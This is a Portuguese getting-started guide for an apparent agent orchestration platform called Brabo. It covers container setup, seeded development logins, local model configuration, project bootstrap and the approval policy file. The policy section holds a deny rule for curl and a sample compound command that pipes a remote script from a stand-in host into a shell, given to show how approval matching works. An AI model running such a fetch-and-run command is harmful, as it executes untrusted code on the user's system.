---
id: getting-started
title: Primeiros passos
sidebar_label: Primeiros passos
sidebar_position: 5
description: Do clone ao primeiro turno de agente, com o que checar quando cada etapa não funciona.
keywords: [instalação, setup, onboarding, primeiro projeto, ollama]
---

# Primeiros passos

Do clone até um agente trabalhando. Se algo falhar, cada etapa tem o que
conferir logo abaixo dela.

## Antes de começar

| ferramenta | por quê |
|---|---|
| Docker e Docker Compose | tudo sobe em container |
| Node 20+ e **pnpm** | o monorepo é pnpm; `npm install` não funciona |
| ~6 GiB de RAM livre | Postgres, três apps e, se quiser agente de verdade, o Ollama |

Elixir **não** é obrigatório: o engine roda no container. Você só precisa dele
no host se for rodar `pnpm engine:dev` fora do Docker — e aí precisa da versão
exata (1.17.3 / OTP 27.1.2), porque o `mix format` de versões diferentes deixa
o CI vermelho.

## 1. Subir

```bash
git clone git@github.com:daneiel/brabo.git
cd brabo
cp .env.example .env
pnpm install
pnpm dev
```

O `.env.example` já vem com tudo apontando para os containers — na primeira
subida você não precisa editar nada.

`pnpm dev` sobe Postgres 16 + pgvector, api, engine e web, e aplica as
migrações dos dois lados. A primeira vez baixa imagens e leva alguns minutos.

### Os dois modos locais não coexistem

Há duas formas de rodar o Brabo na sua máquina, e elas **disputam as mesmas
portas**:

| modo | sobe com | web em | o que é |
|---|---|---|---|
| **desenvolvimento** | `pnpm dev` | <http://localhost:5173> | compose + Vite, com hot reload |
| **validação** | `make deploy-local` | <http://localhost:8088> | k3d com as imagens de produção |

Os dois publicam api em `:3000` e engine em `:4000`. Isso é **deliberado**
(ADR 0025, decisão 10): mantendo as portas, o `docker/smoke.sh` vale nos dois
sem tradução. O preço é que só um roda por vez.

Com o cluster de pé, o `pnpm dev` não consegue publicar a porta do `api`; como
o serviço `web` depende dele, a **5173 nunca abre**. Um `preflight` roda antes
do compose e diz exatamente isso, em vez do `port is already allocated` do
Docker:

```bash
make k8s-down && pnpm dev     # do modo validação para o de desenvolvimento
```

Para saber em qual você está sem adivinhar: `pnpm dev:preflight`.

### Pasta local dos workspaces

Por padrão, os arquivos que os agentes escrevem vivem num volume Docker
gerenciado — não é uma pasta que você abre no Finder/Explorer. Para trocar
por uma pasta real do seu disco, defina no `.env`:

```bash
PROJECT_WORKSPACES_HOST_DIR=~/brabo-projetos
GIT_LOCAL_REPOS_HOST_DIR=~/brabo-projetos-bare
```

As duas juntas, sempre — `api` e `engine` leem o mesmo caminho, e valores
diferentes fariam os dois enxergarem árvores diferentes do mesmo
repositório. A pasta escolhida vira a raiz de **todos** os projetos desta
instância — não aponte para `$HOME` inteiro nem para uma pasta com outros
segredos seus.

Dentro dela, cada projeto tem sua própria subpasta, nomeada por
`workspace_dir_name` (RN-109): projeto criado a partir desta mudança ganha
um nome LEGÍVEL, `<pasta>/<slug>-<8 chars do id>` (ex.: `<pasta>/checkout-
3f2b1c8e`), em vez do UUID puro — mais fácil de reconhecer abrindo a pasta no
Finder/Explorer. Projeto criado ANTES desta mudança continua com a pasta
nomeada pelo UUID puro (`<pasta>/<project_id>`): o nome é decidido uma única
vez, na criação, e nunca é recalculado — nem quando o slug do projeto muda
depois nas Configurações.

Nada na política de aprovação muda: dentro do escopo do projeto o agente já
tinha acesso mais livre e fora dele já pedia aprovação (RN-075) — só o que
antes ficava invisível dentro do volume passa a estar numa pasta que você
pode abrir com seu próprio editor e `git`.

Os containers de `api` e `engine` rodam como **root** em desenvolvimento
(mesma situação já conhecida do `node_modules`/`apps/api/dist` — ver o aviso
no topo deste repositório). Todo arquivo que o agente escrever na pasta
local sai dono de `root` no seu disco — para editar/apagar sem `sudo`
depois, rode uma vez `sudo chown -R $USER ~/brabo-projetos`
(ajuste o caminho para o que você escolheu). Confirmado por execução: um
`docker run` escrevendo num bind mount de teste deixou o arquivo
inacessível ao usuário comum até um segundo container (rodando como root)
removê-lo.

Só testado em Linux/macOS. Bind mount de host no Docker Desktop para Windows
tem armadilhas conhecidas (permissão/dono entre NTFS e o usuário do
container, e NTFS não distingue maiúscula de minúscula onde `git worktree`
espera que distinga) — não habilite lá ainda.

**Se não subir:**

| sintoma | causa |
|---|---|
| porta ocupada | quase sempre é o cluster local ainda de pé — veja acima. Se não for, mude `API_PORT`, `ENGINE_PORT`, `WEB_PORT` ou `OLLAMA_PORT` no `.env`. Mudar `WEB_PORT` é seguro: o `WEB_ORIGIN` do CORS deriva dele, então a origem aceita acompanha a porta ([ADR 0037](adr/0037-cors-do-engine-e-a-porta-como-contrato.md)) |
| api sobe e cai | veja `docker compose logs api` — quase sempre é a migração |

## 2. Entrar

O login é da própria api — não há mais IdP externo
([ADR 0032](adr/0032-corte-do-keycloak-e-sessao-em-cookie.md)). Semeie um
usuário pronto:

```bash
pnpm --filter api seed
```

Ele cria `owner@brabo.dev` (owner) e `dev@brabo.dev` (developer), os dois já
com e-mail verificado e a senha `brabo12345678` — sobrescrevível por
`BRABO_SEED_PASSWORD`. Junto vem o workspace **Acme Corp**, pronto para criar
projeto.

Abra <http://localhost:5173> e entre com essas credenciais.

> **Por que semear em vez de se cadastrar pela tela?** O cadastro funciona, mas
> o login exige e-mail verificado e o `MailSender` é log-only nesta fase — o
> link de verificação sai no log da api e, por default, **sem o token**. Para
> percorrer o fluxo de cadastro de verdade, ligue `AUTH_MAIL_LOG_TOKENS=true`
> no `.env` e pegue o link em `docker compose logs api`. É inconveniente de
> propósito: token de verificação em log de aplicação é credencial em texto
> claro.

**Se o login devolver 401 com a senha certa:** confira que o seed rodou contra
o **mesmo** banco que a api está usando — `DATABASE_URL` do `.env`. A resposta
é a mesma para senha errada, e-mail inexistente e conta bloqueada, de propósito
([RN-032](business-rules.md#rn-032)), então ela não distingue os casos para
você.

## 3. Configurar um modelo

Já vem um: o container do Ollama baixa **`llama3.2:1b`** sozinho no primeiro
boot. Serve para ver o sistema funcionando de ponta a ponta sem configurar
nada.

Ele é pequeno demais para trabalho de verdade, então quando quiser mais:

**Modelo local maior** — de graça, e roda offline:

```bash
docker compose -f docker/docker-compose.yml exec ollama ollama pull qwen2.5:7b
```

**API de provedor** — na UI, em **Projeto → Configurações → Credenciais**. A
chave é cifrada com envelope encryption antes de tocar o banco.

O modelo é resolvido em cascata — **sessão > agente > projeto > workspace**, o
primeiro que existir ([RN-020](business-rules.md#rn-020)). Dá para deixar o
local no geral e pôr um modelo de API só no QA, que é o papel que menos cabe
num modelo pequeno.

> Com GPU NVIDIA, use `pnpm dev:gpu`. Sem a reserva de device o Ollama roda
> 100% em CPU e um prompt de 7.000 tokens leva ~50 s **só de ingestão** — o
> agente parece travado quando na verdade está lendo. O override é opt-in
> porque sem o `nvidia-container-toolkit` no host a reserva faz o serviço
> **falhar ao subir**.

## 4. Criar um projeto

Dashboard → **Novo projeto**. O wizard pede nome e como conectar o git:

| opção | quando usar |
|---|---|
| **Local** | experimentar. Bare repos no disco, sem conta em lugar nenhum |
| **GitHub** / **GitLab** | trabalho de verdade. PAT ou OAuth |

Ao confirmar, roda o **bootstrap de Gitflow**: cinco passos que criam `dev`,
`qa`, `main`, aplicam proteções e commitam os arquivos base. O progresso
aparece ao vivo.

Alguns passos podem sair como **`skipped`** (já estava feito) ou
**`degraded`** (concluiu sem uma capability). Os dois são sucesso. Com o
provider Local, a proteção de branch sempre sai `degraded` — não há plataforma
para aplicá-la, e isso não enfraquece nada: quem impede merge indevido é o
[teto no domínio](reference/permissions.md#os-tetos), não a plataforma.

Se um passo falhar, corrija a causa e mande retomar: o bootstrap continua de
onde parou, não recomeça
([RN-029](business-rules.md#rn-029)).

## 5. O primeiro turno

Abra o projeto → **Sessões** → nova sessão. O Criativo é quem conduz a ideação.

Converse normalmente. Em algum momento ele vai querer fazer algo com efeito
externo — e aí você vê o mecanismo central funcionando: a ação aparece em
**Aprovações** esperando sua decisão, em vez de acontecer.

Aprove e observe o `TokenMeter`: cada turno tem custo, medido na hora.

## 6. Afrouxar (ou apertar) a política

Enquanto tudo pede aprovação, você aprova muito. O `permissions.json`, na raiz
do workspace do projeto, é onde isso se ajusta:

```json
{
  "allow": ["Terminal(pnpm test:*)", "Terminal(git status)"],
  "deny":  ["Terminal(curl:*)"],
  "ask":   []
}
```

Comece por `allow` de comandos idempotentes de leitura. Duas coisas que valem
saber antes de mexer:

- **Casamento é por prefixo de tokens, não substring.** `Terminal(pnpm test)`
  casa `pnpm test --watch`, mas `Terminal(rm)` **não** casa `sudo rm -rf x`.
- **Comando composto exige que todos os segmentos estejam em `allow`.**
  `pnpm test && curl evil.sh | sh` não é auto-aprovado por causa da primeira
  metade.

O formato completo está em [Permissões](reference/permissions.md).

## Quando parece travado

| sintoma | onde olhar |
|---|---|
| agente não responde | modelo configurado? `docker compose logs engine` |
| resposta vazia ou sem sentido | quase sempre é [ambiente de inferência](runbook.md#ambiente-de-inferencia) — contexto truncado ou memória |
| ação não sai de `pending` | é o desenho: ela **espera você** em Aprovações |
| painel não atualiza | o canal Phoenix caiu; recarregue. O event log não se perde |
| sessão parada em `closing` | o drain não completou — [runbook](runbook.md#quando-a-sessao-escapa) |

## Desenvolvendo no projeto

```bash
pnpm --filter api test      # vitest
pnpm --filter web test      # vitest
pnpm engine:test            # ExUnit
pnpm build                  # build de tudo
pnpm db:generate            # depois de mudar apps/api/src/db/schema.ts
pnpm db:migrate             # aplica as migrações
pnpm dev:down               # derruba tudo
```

Trabalhe sempre em `feature/*` a partir de `dev`, com conventional commits em
pt-BR. `CLAUDE.md` tem as convenções completas.

> Os containers de `api` e `web` rodam como root em desenvolvimento e escrevem
> no bind mount. Se depois quiser buildar no host, rode uma vez
> `sudo chown -R $USER apps/api/dist apps/*/node_modules`.

## Depois

- [Arquitetura](architecture.md) — como as peças se encaixam
- [Regras de negócio](business-rules.md) — o que o sistema garante, e onde isso
  vive no código
- [Runbook](runbook.md) — quando sair de desenvolvimento
